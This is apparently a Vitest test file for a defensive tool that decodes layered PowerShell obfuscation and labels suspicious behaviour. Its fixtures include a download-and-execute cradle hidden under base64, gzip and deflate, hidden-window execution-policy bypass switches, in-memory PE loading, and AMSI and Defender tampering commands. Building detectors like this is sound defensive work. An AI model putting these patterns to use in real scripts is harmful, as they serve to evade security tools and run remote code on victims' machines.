import { describe, expect, it } from "vitest";
import { decodePowerShell, findInnerBase64, inflate, MAX_LAYERS } from "./powershell";

const utf16 = (s: string) => {
  const b = new Uint8Array(s.length * 2);
  for (let i = 0; i < s.length; i++) b[i * 2] = s.charCodeAt(i);
  return b;
};
const b64 = (bytes: Uint8Array) => btoa(String.fromCharCode(...bytes));
const enc = (script: string) => b64(utf16(script));
async function compress(text: string | Uint8Array<ArrayBuffer>, format: CompressionFormat) {
  const cs = new CompressionStream(format);
  const w = cs.writable.getWriter();
  void w.write(typeof text === "string" ? new TextEncoder().encode(text) : text);
  void w.close();
  return new Uint8Array(await new Response(cs.readable).arrayBuffer());
}
const titles = (d: Awaited<ReturnType<typeof decodePowerShell>>) => d!.findings.map((f) => f.title);

describe("findInnerBase64", () => {
  it("finds inline and variable forms", () => {
    expect(findInnerBase64("[Convert]::FromBase64String('SGVsbG8gd29ybGQhIQ==')")).toBe("SGVsbG8gd29ybGQhIQ==");
    expect(findInnerBase64('$s = "SGVsbG8g\n d29ybGQhIQ==";[System.Convert]::FromBase64String( $s )')).toBe("SGVsbG8gd29ybGQhIQ==");
    expect(findInnerBase64("$a='SGVsbG8gd29ybGQhIQ=='; FromBase64String($b)")).toBeNull();
    expect(findInnerBase64("Write-Host hi")).toBeNull();
  });
});

describe("inflate", () => {
  it("decompresses and stops at the size cap", async () => {
    expect(await inflate(await compress("hello", "gzip"), "gzip")).toEqual({ bytes: new TextEncoder().encode("hello"), truncated: false });
    const bomb = await inflate(await compress(new Uint8Array(5_000_000), "gzip"), "gzip", 1000);
    expect(bomb?.bytes.length).toBe(1000);
    expect(bomb?.truncated).toBe(true);
  });

  it("returns null for data that isn't compressed", async () => {
    expect(await inflate(new TextEncoder().encode("not gzip at all"), "gzip")).toBeNull();
  });
});

describe("decodePowerShell", () => {
  it("decodes a plain encoded command and flags its switches", async () => {
    const d = await decodePowerShell(`powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ${enc('Write-Host "hi"')}`);
    expect(d!.layers).toEqual([{ how: "Base64 (-EncodedCommand)", encoding: "UTF-16LE", text: 'Write-Host "hi"' }]);
    expect(titles(d)).toEqual(["Hides its window", "Bypasses the execution policy", "Skips the user's PowerShell profile"]);
  });

  it("peels gzip and deflate layers down to the real script", async () => {
    const stage3 = "IEX (New-Object Net.WebClient).DownloadString('https://example.com/a.ps1')";
    const stage2 = `$d=[IO.Compression.DeflateStream]; iex ([IO.StreamReader]::new((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('${b64(await compress(stage3, "deflate-raw"))}'),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()`;
    const stage1 = `$s='${b64(await compress(stage2, "gzip"))}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String($s),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()`;
    const d = await decodePowerShell(`powershell -enc ${enc(stage1)}`);
    expect(d!.layers.map((l) => l.how)).toEqual(["Base64 (-EncodedCommand)", "Base64, then gzip", "Base64, then deflate"]);
    expect(d!.layers[2]!.text).toBe(stage3);
    expect(titles(d)).toEqual(["Downloads code and runs it", "Hidden under 3 layers of encoding"]);
    expect(d!.truncated).toBe(false);
  });

  it("stops at a binary payload and names it", async () => {
    const pe = b64(new Uint8Array([0x4d, 0x5a, 0x90, 0, 3, 0, 0, 0, 4, 0, 0, 0, 0xff, 0xff, 0, 0]));
    const d = await decodePowerShell(`pwsh -ec ${enc(`$b=[Convert]::FromBase64String('${pe}');[Reflection.Assembly]::Load($b)`)}`);
    expect(d!.payload).toMatchObject({ size: 16, fileType: "Windows executable (PE)" });
    expect(titles(d)).toEqual(["Carries a hidden file: Windows executable (PE)", "Loads code straight into memory"]);
  });

  it("flags AMSI and Defender tampering", async () => {
    const d = await decodePowerShell(
      `powershell -e ${enc("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); Add-MpPreference -ExclusionPath C:\\")}`,
    );
    expect(titles(d)).toEqual(["Tries to switch off malware scanning (AMSI)", "Changes Microsoft Defender settings"]);
  });

  it(`gives up after ${MAX_LAYERS} layers`, async () => {
    let script = "Write-Host done";
    for (let i = 0; i < MAX_LAYERS + 2; i++) script = `iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${b64(new TextEncoder().encode(script))}')))`;
    const d = await decodePowerShell(`powershell -enc ${enc(script)}`);
    expect(d!.layers).toHaveLength(MAX_LAYERS);
    expect(d!.truncated).toBe(true);
  });

  it("returns null when there's nothing to decode", async () => {
    expect(await decodePowerShell("powershell -File x.ps1")).toBeNull();
  });
});
